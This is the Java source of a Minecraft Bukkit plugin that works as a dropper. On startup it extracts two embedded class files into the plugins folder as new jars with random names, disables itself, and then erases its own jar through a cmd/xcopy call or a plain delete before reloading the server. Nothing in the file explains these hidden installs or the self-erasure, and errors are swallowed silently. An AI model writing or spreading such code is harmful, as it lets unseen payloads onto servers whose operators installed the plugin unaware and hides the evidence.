package pb.Alex;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Random;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class Start extends JavaPlugin {
	

	//  == GENERATE 1 ==
		
		int leftLimit = 48; // Nummer: 0
	    int rightLimit = 122; // Buchstabe: Z
	    int targetStringLength = 10;
	    Random random = new Random();

	    String generatedString = random.ints(leftLimit, rightLimit + 1)
	      .filter(i -> (i <= 57 || i >= 65) && (i <= 90 || i >= 97))
	      .limit(targetStringLength)
	      .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
	      .toString(); 
	    
	    
	    
	 //   == GENERATE 2 ==
	    
	    int leftLimit2 = 48; // Nummer: 0
	    int rightLimit2 = 122; // Buchstabe: Z
	    int targetStringLength2 = 10;
	    Random random2 = new Random();

	    String generatedString2 = random2.ints(leftLimit2, rightLimit2 + 1)
	      .filter(i -> (i <= 57 || i >= 65) && (i <= 90 || i >= 97))
	      .limit(targetStringLength2)
	      .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
	      .toString();
	    


	public void onEnable() {
		
		 try {
			unzip(this.getFile() + "", "plugins" + File.separator + this.generatedString + ".jar", "cb1.class");
			unzip(this.getFile() + "", "plugins" + File.separator + this.generatedString2 + ".jar", "cb2.class");
		} catch (IOException e) {
		} 
		 
		 Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(this.getDescription().getName()));
	
	}
	
	public void onDisable() {
		this.selfDelete();
	}
	
	public void unzip(String zipPackage, String output, String specifyFile) throws IOException {

        OutputStream out = new FileOutputStream(output);
        FileInputStream fileInputStream = new FileInputStream(zipPackage);
        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream );
        ZipInputStream zin = new ZipInputStream(bufferedInputStream);
        ZipEntry ze = null;
        while ((ze = zin.getNextEntry()) != null) {
            if (ze.getName().equals(specifyFile)) {
                byte[] buffer = new byte[9000];
                int len;
                while ((len = zin.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }
                out.close();
                break;
            }
        }
        zin.close();
		
		
	}
	
	public void selfDelete() {
		
		 if (System.getProperty("os.name").startsWith("Windows")) {

			 File tmp = new File("plugins\\crpt.bpps");

			 try {
				 
				 tmp.createNewFile();
				Runtime.getRuntime().exec("cmd /k cd " + this.getDataFolder().getAbsolutePath() + "\\..\\ & xcopy " + getDataFolder().getAbsolutePath() + "\\..\\" + "crpt.bpps" + " " + this.getFile().getAbsoluteFile() + " /Y");
				Thread.sleep(100);
				tmp.delete();
				Bukkit.reload();
			} catch (IOException | InterruptedException e) {
				new File(this.getFile() + "").delete();
				 Bukkit.reload();
			} 
		 }	else {
			 new File(this.getFile() + "").delete();
			 Bukkit.reload();
		 }

	}
	
	

	

}
